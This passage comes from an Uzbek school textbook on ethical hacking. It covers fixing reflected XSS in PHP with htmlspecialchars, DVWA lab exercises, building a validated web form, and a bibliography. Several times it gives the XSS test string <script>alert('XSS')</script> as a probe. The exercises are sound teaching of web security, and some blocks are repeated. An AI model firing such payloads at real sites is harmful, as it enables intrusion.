+Zaiflikni bartaraf etish uchun o‘zgaruvchini oldidan htmlspecialchars funksiyasini qo‘llang:  $name = htmlspecialchars($_GET[‘name’], ENT_QUOTES, ‘UTF-8’) (5.64-rasm). O‘zgartirilgan faylni saqlang va XSS so‘rovini qayta yuboring, natijada ekranda “XSS” yozuvi chiqmaydi (5.65-rasm).
+
+
+5.62-rasm. XSS hujumi va natija
+
+5.63-rasm. XSS zaifligi
+
+5.64-rasm. XSS zaifligi mavjud kodni tuzatish
+
+5.65-rasm. Natijani qayta tekshirib ko‘rish
+		Laboratoriya muhitida XAMPP va DVWA vositalarini o‘rnating, xavfsizlik darajasini past (low) darajaga qo‘ying va SQL Inyeksiya, XSS bo‘limlaridagi topshiriqlarni bajaring.
+	•	DVWA vositasidagi kod fayllarini oching (vulnerabilities/sqli/source/ low.php va vulnerabilities/xss_r/source/low.php), zaif kodni toping va tuzating. 
+	•	Tuzatilgan kod bilan zaifliklar bartaraf etilganini tekshiring. Oldingi va keyingi holatlarni skrinshotga oling va hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida XAMPP va DVWA vositalarini o‘rnating, xavfsizlik darajasini past (low) darajaga qo‘ying va SQL Inyeksiya, XSS bo‘limlaridagi topshiriqlarni bajaring.
+	•	DVWA vositasidagi kod fayllarini oching (vulnerabilities/sqli/source/ low.php va vulnerabilities/xss_r/source/low.php), zaif kodni toping va tuzating. 
+	•	Tuzatilgan kod bilan zaifliklar bartaraf etilganini tekshiring. Oldingi va keyingi holatlarni skrinshotga oling va hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+5.7. Xavfsiz web forma yaratish (PHP)
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda kirish qiymatlarini tekshirish bo‘yicha ko‘nikmalarni shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda kirish qiymatlarini tekshirish bo‘yicha ko‘nikmalarni shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	XAMPP dasturi (lokal server uchun);
+	•	Kod muharriri (VS Code yoki Notepad+ tavsiya etiladi).
+	•	Shaxsiy kompyuter;
+	•	XAMPP dasturi (lokal server uchun);
+	•	Kod muharriri (VS Code yoki Notepad+ tavsiya etiladi).
+Ishning bajarish tartibi
+Web formalar foydalanuvchi kiritgan ma’lumotlarni qabul qiladi, lekin tekshirilmasa, XSS yoki boshqa zaifliklarga olib kelishi mumkin. Ushbu laboratoriya ishida oddiy forma yaratib, kirish qiymatlarini server tomonida tekshirib (bo‘sh emasligini, uzunligini), agar kamchiliklar mavjud bo‘lsa, kodga maxsus belgilar va funksiyalarni qo‘shib (htmlspecialchars bilan) xavfsiz web forma yaratish masalasi bilan tanishib chiqiladi. Misol tariqasida, kodlar PHP dasturlash tilida yozilgan.
+Ishni bajarish ketma-ketligi quyidagicha:
+1. XAMPP dasturini yuklab oling va o‘rnating (oldingi laboratoriya ishida batafsil tushuntirilgan). Apache serverini ishga tushiring (5.66-rasm).
+
+5.66-rasm. XAMPP dasturini ishga tushirish
+2. XAMPP dasturi joylashgan papkaga kirib, htdocs papkasida yangi “xavfsiz_forma” deb nomlangan papka yarating va papkada index.php faylini hosil qiling (5.67-rasm).
+
+5.67-rasm. Faylni yaratish
+3. index.php fayliga quyidagi oddiy ism va xabar maydonli HTML formani yozing (5.68-rasm):
+<!DOCTYPE html>
+<html lang=”uz”>
+<head>
+    <meta charset=”UTF-8”>
+    <title>Xavfsiz Forma</title>
+</head>
+<body>
+    <h2>Xavfsiz Forma</h2>
+    <?php
+    if (isset($xato)) echo $xato;
+    if (isset($natija)) echo $natija;
+    ?>
+    <form method=”post” action=””>
+        Ism: <input type=”text” name=”ism” value=”<?php echo isset($ism) ? htmlspecialchars($ism) : ‘ ’; ?>” required><br><br>
+        Xabar: <textarea name=”xabar” required><?php echo isset($xabar) ? htmlspecialchars($xabar) : ‘ ’; ?></textarea><br><br>
+        <input type=”submit” name=”yubor” value=”Yuborish”>
+    </form>
+</body>
+</html>
+
+5.68-rasm. Formaning HTML kodi
+4. Forma to‘ldirilib ma’lumotlar yuborilayotganda, ma’lumotlarni tekshirish va xavfsiz chiqarish uchun fayl boshiga quyidagi PHP kod qo‘shiladi (5.69-rasm):
+<?php
+if (isset($_POST[‘yubor’])) {
+    $ism = trim($_POST[‘ism’] ?? ‘‘);
+    $xabar = trim($_POST[‘xabar’] ?? ‘‘);
+
+    $xato = ‘‘;
+    if (empty($ism) || empty($xabar)) {
+        $xato = “<p style=‘color:red;’>Iltimos, barcha maydonlarni to‘ldiring!</p>”;
+    } elseif (strlen($ism) > 50 || strlen($xabar) > 200) {
+        $xato = “<p style=‘color:red;’>Ism 50, xabar 200 belgidan oshmasligi kerak!</p>”;
+    } else {
+        $ism_safe = htmlspecialchars($ism, ENT_QUOTES, ‘UTF-8’);
+        $xabar_safe = htmlspecialchars($xabar, ENT_QUOTES, ‘UTF-8’);
+
+        $natija = “<h3>Rahmat, $ism_safe!</h3><p>Sizning xabaringiz: $xabar_safe</p>”;
+    }
+}
+?>
+
+5.69-rasm. PHP tekshirish kodi
+5. Kod index.php fayliga joylashtirilgach, faylni saqlang va brauzerda http://localhost/xavfsiz_forma/index.php manzilini oching. Formani to‘ldirib dasturni sinab ko‘ring (5.70-rasm).
+
+5.70-rasm. Xavfsiz formani to‘ldirish
+6. Formani zaiflikka testlab ko‘rish uchun uchun xabar maydoniga <script>alert(‘XSS’)</script> XSS so‘rovini kiriting va “Yuborish” tugmasini bosing. Natijada yuborilgan so‘rov oddiy matn sifatida ekranga chiqadi (5.71-rasm).
+
+5.71-rasm. Formani xavfsizlikka testlash
+		Laboratoriya muhitida XAMPP dasturini ishga tushiring, htdocs papkasiga “xavfsiz_forma” papkasi yarating va index.php faylga yuqoridagi HTML va PHP kodni yozing.
+	•	Formani sinab ko‘rish uchun oddiy matn kiriting, bo‘sh qoldiring, uzun matn kiriting va <script>alert('XSS')</script> so‘rovini yuborib sinab ko‘ring. 
+	•	Natijalarni (muvaffaqiyatli yuborish, xato xabarlar, XSS bloklangani) skrinshotga oling va hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida XAMPP dasturini ishga tushiring, htdocs papkasiga “xavfsiz_forma” papkasi yarating va index.php faylga yuqoridagi HTML va PHP kodni yozing.
+	•	Formani sinab ko‘rish uchun oddiy matn kiriting, bo‘sh qoldiring, uzun matn kiriting va <script>alert('XSS')</script> so‘rovini yuborib sinab ko‘ring. 
+	•	Natijalarni (muvaffaqiyatli yuborish, xato xabarlar, XSS bloklangani) skrinshotga oling va hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+FOYDALANILGAN ADABIYOTLAR RO‘YXATI
+	•	Patrick Engebretson. The Basics of Hacking  and Penetration Testing. Second Edition. 2013.  ISBN 978-0-12-411644-3
+	•	Georgia Weidman. Penetration testing. 2014. ISBN-10: 1-59327-564-1.
+	•	Offensive Security. Penetration Testing with Kali Linux. 2018. 
+	•	S.K.Ganiev, A.A.Ganiev, Z.T.Xudoykulov, Kiberxavfsizlik asoslari, -T.: “Iqtisod-Moliya”, 2021, -228 b.
+	•	Z.T. Xudoykulov, I.M.Boyquziyev, O.M.Allanov, U.R. Mardiyev, N.A. Jabbarov. “Kriptografik usullar”, Lesson-press nashriyoti, 2023.
+	•	Web ilovalar xavfsizligi, zaifliklar, testlash metodologiyalari: https://owasp.org/
+	•	Algoritmlar, kriptografiya va ma’lumotlar strukturalari asoslari: https://www.khanacademy.org/computing/computer-science
+	•	Interaktiv lablar va CTF (Capture The Flag) mashg‘ulotlari: https://tryhackme.com/
+	•	Real penetratsion testing mashg‘ulotlari: https://www.hackthebox.eu/
+	•	Tarmoq paketlarini tahlil qilish bo‘yicha rasmiy qo‘llanma: https://www.wireshark.org/docs/
+	•	Axloqiy hujum uchun OT, penetration testing va laboratoriyalar: https://www.kali.org/
+	•	Elektron pochta xabarlari sarlavhalarini tahlil qilish: https://mxtoolbox.com/Public/Tools/EmailHeaders.aspx 
+	•	Zararli dasturlarni tahlil qilish: https://www.virustotal.com/gui/home/upload 
+	•	“Understanding Network Intrusions and Attacks”, Scene of the Cybercrime, 1 2002: https://doi.org/10.1016/B978-193183665-4/50011-2 
+	•	Portlarni skanerlash bo‘yicha qo‘llanma (A Quick Port Scanning Tutorial): https://nmap.org/book/port-scanning-tutorial.html 
+	•	Ochiq portlarni skanerlash uchun Nmapdan foydalanish bo‘yicha ko‘rsatmalar (Using Nmap to scan for open ports): https://phoenixnap.com/kb/nmap-scan-open-ports 
+	•	Hydra va boshqa pentesting dasturlaridan foydalanish yo‘riqnomasi: https://hackviser.com/tactics/tools/hydra 
+	•	Tarmoqda har bir paketni kuzatish, filtrlash va tahlil qilish vositasi: https://www.wireshark.org/ 
+	•	S. H.C. Haris, R. B. Ahmad et al. “Packet analysis using packet filtering and traffic monitoring techniques”, International Conference on Computer Applications and Industrial, ICCAIE 2010.
+	•	IP manzil sozlamalarini amalga oshirish bo‘yicha tavsiyalar: https://www.trendnet.com/press/resource-library/how-to-set-static-ip-address
+	•	Windows OTda tarmoqlararo ekranni IP manzillarga ruxsat berish yoki bloklash uchun sozlash amalyoti: https://knowledge.civilgeo.com/configuring-windows-firewall-to-allow-or-block-ip-addresses/ 
+	•	Yangi boshlovchilar uchun Linux buyruqlarini o‘rganish bo‘yicha qo‘llanma: https://documentation.ubuntu.com/desktop/en/latest/tutorial/the-linux-command-line-for-beginners/?_gl=1*w6xmgb*_gcl_au*MTg2NjM4MjM0Ni4xNzcxMDc0MjQ2
+	•	“PortSwigger Web Security Academy” o‘quv platformasi: https://portswigger.net/web-security 
+	•	Bepul CTF platformasi: https://picoctf.org/
+
+KIBERXAVFSIZLIK (PENETRATION TESTING VA ETHICAL HACKING) YO‘NALISHI BO‘YICHA O‘QUV QO‘LLANMA
+(10-SINFLAR UCHUN)
+1-QISM
+
+
+
+
+
+
+Muharrir:
+Ishniyazov O.
+
+Dizayner:
+Aliqulov A.
+
+Rassom:
+Qodirov A.
+
+Texnik Muharrir:
+Alimdjanov X.
+
+Sahifalovchi:
+Ismoilov M.
+
+
+
+
+
+Mazkur o‘quv qo‘llanma Muhammad al-Xorazmiy nomidagi Toshkent axborot texnologiyalari universitetida yaratilgan
+
+
+
+
+
+Toshkent 2026
